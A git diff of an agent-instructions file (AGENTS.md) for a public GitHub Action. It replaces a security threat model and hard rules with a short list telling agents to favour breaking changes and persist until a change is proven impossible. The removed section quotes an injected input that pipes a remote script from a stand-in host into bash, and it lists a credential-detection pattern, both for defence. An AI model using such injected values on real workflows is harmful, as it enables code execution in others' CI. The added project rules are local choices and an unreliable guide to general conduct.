@@ -1,96 +1,10 @@
-# AGENTS.md — validate-agent-action
+# Rules
 
-A composite GitHub Action used by other repos in `jackin-project` to validate agent repos and build their Docker images multi-platform. **This repo is public**, and every call to this action from any consumer workflow executes the shell scripts here with inputs the caller provides.
+- No legacy code. Finish every migration: remove old paths completely—no compatibility shims, aliases, or deprecation periods. Breaking changes are preferred.
+- This is a research project. It is unsafe and expected to contain breaking changes; never treat it as production-ready. Break things when needed and deliver new implementations fast.
+- Always apply these principles:
+  - Judge work by correctness, consistency, and project fit. Never defer a known-wrong state because of ROI, cost, effort, or claims that it is low-value, marginal, or an edge case.
+  - Stop only when the required change is proven impossible with the available tools or model. When uncertain, inspect, test, and measure first.
+  - Before fixing a bug, identify why the architecture permitted it and whether the same structure permits related bugs.
+  - Prefer fixes that remove the enabling condition. Use a symptom-layer patch only when the root fix is proven infeasible or belongs in a separate change, and name the deferred root cause.
 
-Treat every commit as a change to code that runs inside someone else's CI with `GITHUB_TOKEN` scope.
-
-## Threat model
-
-1. **Workflow injection via inputs.** `action.yml` inputs (`path`, `jackin-version`, `build-platforms`) flow into bash scripts. Unquoted or naively-interpolated use creates command-injection vectors — e.g., a malicious consumer repo with `jackin-version: "0.5.0; curl evil.sh | bash"` if we ever stop quoting. Existing code quotes every interpolation; breaking that is the fastest regression path.
-2. **Un-pinned action refs.** `action.yml` pins `docker/setup-qemu-action` and `docker/setup-buildx-action` by full 40-char SHA. Any new dependency must be pinned the same way — tags (`@v3`) are mutable, SHAs are not.
-3. **`GITHUB_TOKEN` blast radius.** `GH_TOKEN: ${{ github.token }}` is exported into the downloader script. Default token scope includes read/write on the calling repo and read on other org repos. A script bug that posts/uploads somewhere unexpected leaks this token's power to anyone who can read those destinations.
-4. **Cross-repo artifact trust.** `download-validator.sh` fetches validator builds from `jackin-project/jackin`'s CI artifacts (latest-build mode) or signed release archives (tagged mode). Whoever controls `jackin-project/jackin/.github/workflows/ci.yml` serves the binary that ends up in every consumer agent's CI. Ruleset protection on `jackin` is the anchor; validate it periodically.
-5. **Docker build context.** `build-image.sh` runs `docker buildx build` on `${REPO_PATH}`. Path is caller-provided but scoped to the checked-out repo, so the threat is a malicious *agent* repo shipping a malicious Dockerfile — which is the system under test, not a lateral risk here.
-
-## Hard rules (do not break these)
-
-1. **Every user-controlled input must be quoted in shell.** `"$JACKIN_VERSION"`, `"$AGENT_PATH"`, etc. — never bare. Audit any `.sh` change for this.
-2. **Every third-party action ref must be a 40-char SHA**, with the semver as a trailing comment (`# v3.2.0`). Never `@main`, `@v3`, or a tag-only ref.
-3. **Tagged release downloads must verify `sha256`.** The checksum file from the release is the only tamper check. Latest-build mode falls back to GitHub's artifact integrity; document that clearly so consumers know the weaker guarantee.
-4. **Never log or echo `$GH_TOKEN`.** `set -x` is banned in these scripts.
-5. **Never introduce `set -o pipefail` + `| head -n1`** (see PR #2 for why — the SIGPIPE trap flakes CI nondeterministically).
-
-## Required pre-commit checks
-
-```bash
-# 1. What's staged? Anything surprising?
-git status --porcelain
-
-# 2. Shell scripts: syntax + shellcheck if available
-for f in $(git diff --cached --name-only -- '*.sh'); do
-  bash -n "$f" || { echo "SYNTAX FAIL: $f"; exit 1; }
-  command -v shellcheck >/dev/null && shellcheck "$f"
-done
-
-# 3. action.yml sanity: every `uses:` line must carry a 40-char SHA
-if git diff --cached --name-only -- action.yml | grep -q .; then
-  grep -E '^\s+uses:' action.yml | grep -Ev '@[0-9a-f]{40}' \
-    && { echo "UN-PINNED ACTION IN action.yml"; exit 1; } || true
-fi
-
-# 4. Credential scan (defense-in-depth)
-git diff --cached --name-only -z | xargs -0 -r \
-  grep -l -iE "ghp_|gho_|ghs_|ghr_|github_pat_|BEGIN [A-Z ]*PRIVATE KEY|aws_access_key_id|aws_secret_access_key|bearer [a-z0-9-]{20,}" 2>/dev/null
-```
-
-## Upstream dependencies
-
-This action depends on `jackin-project/jackin` serving well-formed validator artifacts. If that repo's CI or releases are compromised, consumers of this action inherit the compromise.
-
-Verify periodically:
-```bash
-gh api repos/jackin-project/jackin/rulesets --jq '.[] | {name, target, enforcement}'
-```
-
-Expect at least one `branch` ruleset with `enforcement: active` on `~DEFAULT_BRANCH`.
-
-## Conventions
-
-- Branch naming: `chore/*`, `feat/*`, `fix/*`
-- Commit messages: see [Commit Messages](#commit-messages) section below
-- `main` is the primary branch
-- All changes go through PR
-
-## What this does NOT protect against
-
-- A malicious caller workflow passing crafted inputs to `action.yml` — we quote defensively, but a new input added without quoting is an injection risk. Review every new input carefully.
-- A compromised `docker/setup-qemu-action` or `docker/setup-buildx-action` upstream — SHA pinning pins to a *specific* version; if we update the SHA, we inherit whatever is at the new SHA. Vet the diff before bumping.
-- A compromised `jackin-project/jackin` CI pipeline — addressed in that repo, not here.
-
-## Commit Messages
-
-All commits in this repository MUST follow [Conventional Commits 1.0.0](https://www.conventionalcommits.org/en/v1.0.0/).
-
-Subject format: `<type>[optional scope][!]: <description>`
-
-Allowed types:
-
-| Type       | Use for                                                |
-| ---------- | ------------------------------------------------------ |
-| `feat`     | New user-visible feature                               |
-| `fix`      | Bug fix                                                |
-| `docs`     | Documentation-only change                              |
-| `style`    | Formatting, whitespace; no logic change                |
-| `refactor` | Internal restructuring; no behavior change             |
-| `perf`     | Performance improvement                                |
-| `test`     | Adding or updating tests                               |
-| `build`    | Build system, tooling, dependencies                    |
-| `ci`       | CI configuration                                       |
-| `chore`    | Routine maintenance (release, merge, deps)             |
-| `revert`   | Reverts a prior commit                                 |
-
-Scope is optional but encouraged when it clarifies the change area.
-
-Breaking changes use `!` after the type/scope (`feat!:` or `feat(api)!:`) and include a `BREAKING CHANGE:` footer in the body.
-
-PR squash-merge: the PR title becomes the commit subject, so PR titles must also follow this convention.
